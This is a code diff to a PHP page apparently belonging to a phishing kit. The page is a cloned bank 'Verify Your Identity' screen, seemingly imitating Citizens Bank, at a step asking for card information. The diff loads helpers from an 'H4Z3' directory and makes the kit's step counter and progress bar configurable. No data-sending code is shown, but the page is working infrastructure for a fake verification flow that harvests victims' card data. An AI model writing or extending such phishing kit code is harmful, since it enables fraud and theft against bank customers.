@@ -1,3 +1,24 @@
+<?php
+require_once __DIR__ . '/settings.php';
+require_once __DIR__ . '/H4Z3/functions.php';
+
+$stepKey = 'card';
+$steps = h4z3_get_flow_steps();
+$totalSteps = count($steps);
+$currentStep = null;
+
+foreach ($steps as $index => $step) {
+    if (($step['key'] ?? null) === $stepKey) {
+        $currentStep = $index + 1;
+        break;
+    }
+}
+
+if ($currentStep === null) {
+    header('Location: ' . h4z3_get_first_step_path());
+    exit;
+}
+?>
 <!DOCTYPE html>
 <html class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Firefox citizens-user-none" lang="en-US">
     <head>
@@ -28,16 +49,14 @@
                         <h2 class="unauth-intro-area__title ">Verify Your Identity</h2>
                         <div>
                             <div class="unauth-intro-area__step">
-                                <strong>Step 3 of 5:</strong>
+                                <strong>Step <?php echo $currentStep; ?> of <?php echo $totalSteps; ?>:</strong>
                                 <span>Verify Your Card Information</span>
                             </div>
                             <div class="unauth-intro-area__progress-container">
                                 <div class="unauth-intro-area__progress-segment">
-                                    <div class="unauth-intro-area__progress-item -js-progress-green"></div>
-                                    <div class="unauth-intro-area__progress-item -js-progress-green"></div>
-                                    <div class="unauth-intro-area__progress-item -js-progress-green"></div>
-                                    <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
-                                    <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
+<?php for ($position = 1; $position <= $totalSteps; $position++): ?>
+                                    <div class="unauth-intro-area__progress-item <?php echo $position <= $currentStep ? '-js-progress-green' : '-js-progress-light-green'; ?>"></div>
+<?php endfor; ?>
                                 </div>
                             </div>
                         </div>
